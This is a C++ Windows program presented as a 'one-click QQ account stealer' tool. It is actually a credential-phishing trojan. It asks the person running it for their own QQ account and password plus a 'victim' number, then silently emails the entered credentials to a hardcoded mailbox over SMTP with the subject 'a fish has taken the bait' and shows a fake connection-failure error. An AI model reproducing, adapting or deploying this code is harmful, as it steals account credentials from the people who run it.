#include <windows.h>
#include <iostream>
#include <string>
#include <winsock2.h>

#define smtp_server "smtp.qq.com" // 根据自己选定的邮箱更改smtp地址
#define Email_account "test@qq.com" // 根据自己邮箱更改
#define smtp_password "123456789" // 根据生成的smtp秘钥更改 

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
HBRUSH hBrushBackground; // 窗口背景画刷
COLORREF windowBgColor;	 // 窗口背景色
HWND hwndAccountEdit;	 // 账号输入框
HWND hwndPasswordEdit;	 // 密码输入框
HWND hwndInviteCodeEdit; // 邀请码输入框

bool isAllDigits(const char *arr)
{
	for (int i = 0; arr[i] != '\0'; i++)
	{
		if (arr[i] < '0' || arr[i] > '9')
		{
			return false;
		}
	}
	return true;
}
int countValidChars(const char *arr)
{
	int count = 0;
	for (int i = 0; arr[i] != '\0'; i++)
	{
		count++;
	}
	return count;
}
std::string base64_encode(const unsigned char *data, size_t length)
{
	static const std::string base64_chars =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz"
		"0123456789+/";

	std::string encoded;
	encoded.reserve(((length + 2) / 3) * 4);
	for (size_t i = 0; i < length; i += 3)
	{
		unsigned int triplet = data[i] << 16;
		if (i + 1 < length)
			triplet |= data[i + 1] << 8;
		if (i + 2 < length)
			triplet |= data[i + 2];

		for (int j = 0; j < 4; ++j)
		{
			if (i * 8 + j * 6 > length * 8)
				encoded += '=';
			else
				encoded += base64_chars[(triplet >> (3 - j) * 6) & 0x3F];
		}
	}

	return encoded;
}
bool SendEmail(const std::string &smtpDomain, const std::string &emailAccount, const std::string &emailPassword, const std::string &emailSubject, const std::string &emailContent)
{
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		std::cout << "Failed to initialize winsock." << std::endl;
		return false;
	}
	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET)
	{
		std::cout << "Failed to create socket." << std::endl;
		WSACleanup();
		return false;
	}
	HOSTENT *host = gethostbyname(smtpDomain.c_str());
	if (host == nullptr)
	{
		std::cout << "Failed to get SMTP server IP." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	SOCKADDR_IN serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(25);
	serverAddr.sin_addr.s_addr = *((unsigned long *)host->h_addr);
	if (connect(clientSocket, (SOCKADDR *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
	{
		std::cout << "Failed to connect to SMTP server." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	char buffer[4096];
	memset(buffer, 0, sizeof(buffer));
	if (recv(clientSocket, buffer, sizeof(buffer), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to receive server response." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	std::string heloCmd = "HELO localhost\r\n";
	if (send(clientSocket, heloCmd.c_str(), heloCmd.size(), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to send HELO command." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	memset(buffer, 0, sizeof(buffer));
	if (recv(clientSocket, buffer, sizeof(buffer), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to receive server response." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	std::string authCmd = "AUTH LOGIN\r\n";
	if (send(clientSocket, authCmd.c_str(), authCmd.size(), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to send AUTH LOGIN command." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	memset(buffer, 0, sizeof(buffer));
	if (recv(clientSocket, buffer, sizeof(buffer), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to receive server response." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	std::string encodedAccount = base64_encode(reinterpret_cast<const unsigned char *>(emailAccount.c_str()), emailAccount.length());
	encodedAccount += "\r\n";
	if (send(clientSocket, encodedAccount.c_str(), encodedAccount.size(), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to send encoded email account." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	memset(buffer, 0, sizeof(buffer));
	if (recv(clientSocket, buffer, sizeof(buffer), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to receive server response." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	std::string encodedPassword = base64_encode(reinterpret_cast<const unsigned char *>(emailPassword.c_str()), emailPassword.length());
	encodedPassword += "\r\n";
	if (send(clientSocket, encodedPassword.c_str(), encodedPassword.size(), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to send encoded email password." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	memset(buffer, 0, sizeof(buffer));
	if (recv(clientSocket, buffer, sizeof(buffer), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to receive server response." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	std::string mailFromCmd = "MAIL FROM: <" + emailAccount + ">\r\n";
	if (send(clientSocket, mailFromCmd.c_str(), mailFromCmd.size(), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to send MAIL FROM command." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	memset(buffer, 0, sizeof(buffer));
	if (recv(clientSocket, buffer, sizeof(buffer), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to receive server response." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	std::string rcptToCmd = "RCPT TO: <" + emailAccount + ">\r\n";
	if (send(clientSocket, rcptToCmd.c_str(), rcptToCmd.size(), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to send RCPT TO command." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	memset(buffer, 0, sizeof(buffer));
	if (recv(clientSocket, buffer, sizeof(buffer), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to receive server response." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	std::string dataCmd = "DATA\r\n";
	if (send(clientSocket, dataCmd.c_str(), dataCmd.size(), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to send DATA command." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	memset(buffer, 0, sizeof(buffer));
	if (recv(clientSocket, buffer, sizeof(buffer), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to receive server response." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	std::string email = "Subject: " + emailSubject + "\r\n";
	email += "From: " + emailAccount + "\r\n";
	email += "To: " + emailAccount + "\r\n";
	email += emailContent + "\r\n.\r\n";

	if (send(clientSocket, email.c_str(), email.size(), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to send email." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	memset(buffer, 0, sizeof(buffer));
	if (recv(clientSocket, buffer, sizeof(buffer), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to receive server response." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	std::string quitCmd = "QUIT\r\n";
	if (send(clientSocket, quitCmd.c_str(), quitCmd.size(), 0) == SOCKET_ERROR)
	{
		std::cout << "Failed to send QUIT command." << std::endl;
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}

	closesocket(clientSocket);
	WSACleanup();

	return true;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	const char *className = "QQ_Hacker_Tool";
	WNDCLASS wc = {};
	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = className;
	RegisterClass(&wc);

	HWND hwnd = CreateWindowEx(0, className, "QQ一键盗号程序", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT,
							   400, 200, nullptr, nullptr, hInstance, nullptr);

	hBrushBackground = CreateSolidBrush(RGB(255, 255, 255));
	SetClassLongPtr(hwnd, GCLP_HBRBACKGROUND, (LONG_PTR)hBrushBackground);

	HDC hdc = GetDC(hwnd);
	windowBgColor = GetBkColor(hdc);
	ReleaseDC(hwnd, hdc);

	HWND hwndAccountLabel = CreateWindow("STATIC", "你的QQ账号:", WS_VISIBLE | WS_CHILD | SS_LEFT, 20, 20, 100, 20, hwnd, nullptr, hInstance, nullptr);
	SetWindowLongPtr(hwndAccountLabel, GWL_EXSTYLE, GetWindowLongPtr(hwndAccountLabel, GWL_EXSTYLE) | WS_EX_TRANSPARENT);

	hwndAccountEdit = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL, 130, 20, 200, 20, hwnd, nullptr, hInstance, nullptr);

	HWND hwndPasswordLabel = CreateWindow("STATIC", "你的QQ密码:", WS_VISIBLE | WS_CHILD | SS_LEFT, 20, 50, 100, 20, hwnd, nullptr, hInstance, nullptr);
	SetWindowLongPtr(hwndPasswordLabel, GWL_EXSTYLE, GetWindowLongPtr(hwndPasswordLabel, GWL_EXSTYLE) | WS_EX_TRANSPARENT);

	hwndPasswordEdit = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL | ES_PASSWORD, 130, 50, 200, 20, hwnd, nullptr, hInstance, nullptr);

	HWND hwndInviteCodeLabel = CreateWindow("STATIC", "受害者QQ账号:", WS_VISIBLE | WS_CHILD | SS_LEFT, 20, 80, 100, 20, hwnd, nullptr, hInstance, nullptr);
	SetWindowLongPtr(hwndInviteCodeLabel, GWL_EXSTYLE, GetWindowLongPtr(hwndInviteCodeLabel, GWL_EXSTYLE) | WS_EX_TRANSPARENT);

	hwndInviteCodeEdit = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL, 130, 80, 200, 20, hwnd, nullptr, hInstance, nullptr);

	HWND hwndLoginButton = CreateWindow("BUTTON", "一键盗号", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 200, 120, 80, 30, hwnd, (HMENU)1, nullptr, nullptr);

	ShowWindow(GetConsoleWindow(), SW_HIDE);
	ShowWindow(hwnd, nCmdShow);

	MSG msg = {};
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	DeleteObject(hBrushBackground);

	return 0;
}
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_CTLCOLORSTATIC:
	{
		HDC hdcStatic = (HDC)wParam;
		SetTextColor(hdcStatic, RGB(0, 0, 0));
		SetBkColor(hdcStatic, windowBgColor);
		return (LRESULT)hBrushBackground;
	}
	case WM_COMMAND:
	{
		if (LOWORD(wParam) == 1)
		{
			char accountBuffer[256];
			GetWindowTextA(hwndAccountEdit, accountBuffer, sizeof(accountBuffer));

			char passwordBuffer[256];
			GetWindowTextA(hwndPasswordEdit, passwordBuffer, sizeof(passwordBuffer));

			char inviteCodeBuffer[256];
			GetWindowTextA(hwndInviteCodeEdit, inviteCodeBuffer, sizeof(inviteCodeBuffer));

			if (accountBuffer[0] == '\0')
				MessageBox(hwnd, "账号不能为空！", "错误", MB_OK | MB_ICONERROR);
			else if (passwordBuffer[0] == '\0')
				MessageBox(hwnd, "密码不能为空！", "错误", MB_OK | MB_ICONERROR);
			else if (inviteCodeBuffer[0] == '\0')
				MessageBox(hwnd, "受害者QQ账号不能为空！", "错误", MB_OK | MB_ICONERROR);
			else if (!isAllDigits(accountBuffer) || countValidChars(accountBuffer) < 5)
				MessageBox(hwnd, "账号格式错误！！！", "错误", MB_OK | MB_ICONERROR);
			else if (!isAllDigits(inviteCodeBuffer) || countValidChars(inviteCodeBuffer) < 5)
				MessageBox(hwnd, "受害者账号格式错误！！！", "错误", MB_OK | MB_ICONERROR);
			else
			{
				SendEmail(smtp_server, Email_account, smtp_password, "有鱼上钩啦！", "账号：" + std::string(accountBuffer) + "\n密码：" + std::string(passwordBuffer));
				MessageBox(hwnd, "连接服务器失败！请尝试检查网络设置或稍后再试！", "提示", MB_OK);
			}
		}
		break;
	}
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
}
